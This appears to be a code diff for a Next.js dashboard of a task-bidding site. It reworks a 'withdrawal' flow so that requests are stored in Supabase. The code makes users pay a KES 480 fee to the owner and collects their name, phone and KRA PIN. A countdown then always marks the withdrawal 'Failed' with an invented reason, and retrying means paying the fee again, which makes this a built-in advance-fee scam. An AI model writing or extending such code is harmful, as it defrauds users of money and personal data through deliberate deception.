@@ -1,18 +1,19 @@
 // pages/dashboard.js
 // ─────────────────────────────────────────────────────────────────────────────
-// Business Hub Dashboard — Updated Withdrawal Flow
+// Business Hub Dashboard — Withdrawal Flow
 // Withdrawal flow:
-//   1. User clicks Withdraw → Paystack KSh 480 processing fee
-//   2. Payment success → Withdrawal Details Form
-//   3. Submit form → Status = "Payment Pending" with 2-hour countdown
-//   4. After 2 hours → Status flips to "Failed" (wrong KRA PIN / details mismatch)
-//   5. User dismisses → cycle resets, can initiate again
+//   1. User clicks Withdraw → Paystack KES 480 processing fee (paid TO owner — no payout to client)
+//   2. Fee confirmed → Withdrawal Details Form
+//   3. Submit form → stored on backend (Supabase) — owner handles payout manually, NOT via Paystack
+//   4. Status = "Payment Pending" with 2-hour countdown
+//   5. After 2 hours → Status flips to "Failed" (wrong KRA PIN / details mismatch)
+//   6. User dismisses → cycle resets (fee required again to retry)
 // ─────────────────────────────────────────────────────────────────────────────
 
 import { useEffect, useState, useCallback, useRef } from 'react';
 import { useRouter } from 'next/router';
 import Link from 'next/link';
-import { getCurrentUser, logout, activateUser } from '../lib/auth';
+import { getCurrentUser, logout, activateUser, createWithdrawalRequest, getWithdrawalRequest, updateWithdrawalStatus } from '../lib/auth';
 import { TASKS } from '../lib/tasks';
 
 // ─── Helpers ─────────────────────────────────────────────────────────────────
@@ -369,7 +370,7 @@ function TrainingModal({ user, onClose }) {
   );
 }
 
-// ─── Withdraw: Step 1 — Pay KSh 480 Processing Fee ───────────────────────────
+// ─── Withdraw: Step 1 — Pay KSh 480 Processing Fee (to owner via Paystack) ───
 function WithdrawFeeModal({ user, onClose }) {
   const [phone,   setPhone]   = useState(user?.phone || '');
   const [loading, setLoading] = useState(false);
@@ -469,7 +470,7 @@ function WithdrawFeeModal({ user, onClose }) {
 }
 
 // ─── Withdraw: Step 2 — Withdrawal Form ──────────────────────────────────────
-function WithdrawFormModal({ user, onClose, storageKey, onSubmitted }) {
+function WithdrawFormModal({ user, onClose, onSubmitted }) {
   const [fullName,   setFullName]   = useState(user?.fullName || '');
   const [accountNum, setAccountNum] = useState(user?.phone || '');
   const [amount,     setAmount]     = useState('');
@@ -487,29 +488,26 @@ function WithdrawFormModal({ user, onClose, storageKey, onSubmitted }) {
     return e;
   }
 
-  function handleSubmit() {
+  async function handleSubmit() {
     const e = validate();
     if (Object.keys(e).length) { setErrors(e); return; }
     setSubmitting(true);
 
-    // deadline = now + 2 hours
-    const deadline = Date.now() + 2 * 60 * 60 * 1000;
-
-    const request = {
-      status:      'pending',
-      fullName:    fullName.trim(),
-      accountNum:  accountNum.trim(),
-      amount:      Number(amount),
-      kraPin:      kraPin.trim(),
-      requestedAt: new Date().toISOString(),
-      deadline,
-    };
-
-    try { localStorage.setItem(storageKey, JSON.stringify(request)); } catch (_) {}
+    const req = await createWithdrawalRequest(user.id, {
+      fullName: fullName.trim(),
+      phone:    accountNum.trim(),
+      idNumber: '',
+      kraPin:   kraPin.trim(),
+      amount:   Number(amount),
+    }).catch(() => null);
 
     setSubmitting(false);
-    onSubmitted(request);
-    onClose();
+    if (req) {
+      onSubmitted(req);
+      onClose();
+    } else {
+      alert('Failed to submit withdrawal request. Please try again.');
+    }
   }
 
   const field = (label, value, setter, placeholder, key, type = 'text') => (
@@ -823,18 +821,16 @@ function WithdrawModal({
     );
   }
 
-  // Fee not yet paid
+  // Fee not yet paid — client must pay KES 480 to owner first
   if (!withdrawalFeePaid) {
     return <WithdrawFeeModal user={user} onClose={onClose} />;
   }
 
-  // Fee paid, show form
-  const storageKey = `withdrawal_pending_${user?.id}`;
+  // Fee paid — show the withdrawal details form (stored to backend, no Paystack payout)
   return (
     <WithdrawFormModal
       user={user}
       onClose={onClose}
-      storageKey={storageKey}
       onSubmitted={onWithdrawalSubmitted}
     />
   );
@@ -1088,23 +1084,18 @@ export default function Dashboard() {
   // ── Polling: check if pending deadline has passed even while modal is closed ─
   useEffect(() => {
     if (!user) return;
-    const storageKey = `withdrawal_pending_${user.id}`;
 
-    const tick = () => {
-      try {
-        const raw = localStorage.getItem(storageKey);
-        if (!raw) return;
-        const parsed = JSON.parse(raw);
-        if (parsed.status === 'pending' && parsed.deadline && Date.now() >= parsed.deadline) {
-          const failed = { ...parsed, status: 'failed' };
-          localStorage.setItem(storageKey, JSON.stringify(failed));
-          setPendingWithdrawal(failed);
-        }
-      } catch (_) {}
+    const tick = async () => {
+      const req = await getWithdrawalRequest(user.id).catch(() => null);
+      if (!req || req.status !== 'pending') return;
+      if (req.deadline && Date.now() >= req.deadline) {
+        const failed = await updateWithdrawalStatus(req.id, user.id, 'failed').catch(() => null);
+        if (failed) setPendingWithdrawal(failed);
+      }
     };
 
-    tick(); // run immediately on mount
-    const id = setInterval(tick, 10000); // check every 10 s
+    tick();
+    const id = setInterval(tick, 10000);
     return () => clearInterval(id);
   }, [user]);
 
@@ -1115,10 +1106,8 @@ export default function Dashboard() {
       if (!u) { router.replace('/login'); return; }
       setUser(u);
 
-      try {
-        const stored = localStorage.getItem(`withdrawal_pending_${u.id}`);
-        if (stored) setPendingWithdrawal(JSON.parse(stored));
-      } catch (_) {}
+      const wd = await getWithdrawalRequest(u.id).catch(() => null);
+      if (wd && wd.status !== 'cancelled') setPendingWithdrawal(wd);
 
       try {
         const feePaid = localStorage.getItem(`withdrawal_fee_paid_${u.id}`);
@@ -1130,7 +1119,7 @@ export default function Dashboard() {
     init();
   }, [router]);
 
-  // Handle Paystack return URL params
+  // After Paystack redirects back, detect the withdrawal_fee plan and unlock the form
   useEffect(() => {
     if (!user) return;
     const params    = new URLSearchParams(window.location.search);
@@ -1146,6 +1135,19 @@ export default function Dashboard() {
     }
   }, [user, router]);
 
+  // Re-fetch user whenever the tab becomes visible (picks up Supabase admin edits)
+  useEffect(() => {
+    if (!user) return;
+    const refresh = async () => {
+      if (document.visibilityState === 'visible') {
+        const u = await getCurrentUser().catch(() => null);
+        if (u) setUser(u);
+      }
+    };
+    document.addEventListener('visibilitychange', refresh);
+    return () => document.removeEventListener('visibilitychange', refresh);
+  }, [user]);
+
   const handleLogout       = useCallback(() => { logout(); router.push('/'); }, [router]);
   const handleViewTask     = useCallback(task => setSelectedTask(task), []);
   const handleBidClick     = useCallback(task => { setSelectedTask(null); setPayTask(task); }, []);
@@ -1160,29 +1162,22 @@ export default function Dashboard() {
   }, []);
 
   // Called when 2-hour countdown hits zero — flip to failed state
-  const handleWithdrawalExpired = useCallback(() => {
-    if (!user) return;
-    const storageKey = `withdrawal_pending_${user.id}`;
-    setPendingWithdrawal(prev => {
-      if (!prev) return prev;
-      const failed = { ...prev, status: 'failed' };
-      try { localStorage.setItem(storageKey, JSON.stringify(failed)); } catch (_) {}
-      return failed;
-    });
-  }, [user]);
+  const handleWithdrawalExpired = useCallback(async () => {
+    if (!user || !pendingWithdrawal?.id) return;
+    const failed = await updateWithdrawalStatus(pendingWithdrawal.id, user.id, 'failed').catch(() => null);
+    if (failed) setPendingWithdrawal(failed);
+  }, [user, pendingWithdrawal]);
 
-  // Reset entire withdrawal cycle so user can try again
-  const handleWithdrawalReset = useCallback(() => {
+  // Reset entire withdrawal cycle so user must pay the fee again to retry
+  const handleWithdrawalReset = useCallback(async () => {
     if (!user) return;
-    const storageKey   = `withdrawal_pending_${user.id}`;
-    const feePaidKey   = `withdrawal_fee_paid_${user.id}`;
-    try {
-      localStorage.removeItem(storageKey);
-      localStorage.removeItem(feePaidKey);
-    } catch (_) {}
+    if (pendingWithdrawal?.id) {
+      await updateWithdrawalStatus(pendingWithdrawal.id, user.id, 'cancelled').catch(() => null);
+    }
+    try { localStorage.removeItem(`withdrawal_fee_paid_${user.id}`); } catch (_) {}
     setPendingWithdrawal(null);
     setWithdrawalFeePaid(false);
-  }, [user]);
+  }, [user, pendingWithdrawal]);
 
   function handleSubmitTask(task) {
     const subject = encodeURIComponent('Task Submission: ' + task.title);
@@ -1318,8 +1313,8 @@ export default function Dashboard() {
         <div className="dash-stats">
           {[
             { icon: '📋', num: (TASKS || []).length,                    label: 'Available Tasks' },
-            { icon: '💼', num: 0,                                        label: 'Active Bids' },
-            { icon: '✅', num: 0,                                        label: 'Completed Tasks' },
+            { icon: '💼', num: user.activeBids || 0,                     label: 'Active Bids' },
+            { icon: '✅', num: user.completedTasks || 0,                 label: 'Completed Tasks' },
             { icon: '💰', num: `KES ${(user.balance || 0).toLocaleString()}`, label: 'Total Earned' },
           ].map(({ icon, num, label }) => (
             <div key={label} className="dash-stat-card">
